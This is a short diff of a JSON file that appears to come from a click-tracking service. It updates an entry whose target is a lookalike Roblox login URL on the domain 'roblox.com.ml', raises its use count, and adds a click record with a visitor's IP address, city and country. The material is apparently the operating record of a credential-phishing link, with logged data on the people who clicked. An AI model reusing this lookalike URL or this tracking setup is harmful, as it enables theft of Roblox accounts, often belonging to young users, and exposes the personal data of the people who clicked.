@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 19,
+    "useCount": 20,
     "createdBy": "admin",
     "clicks": [
       {
@@ -264,6 +264,14 @@
         "city": "Baguio City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1776863736347,
+        "ip": "41.90.137.94",
+        "country": "Kenya",
+        "city": "Nairobi",
+        "flag": "🇰🇪",
+        "countryCode": "KE"
       }
     ]
   },
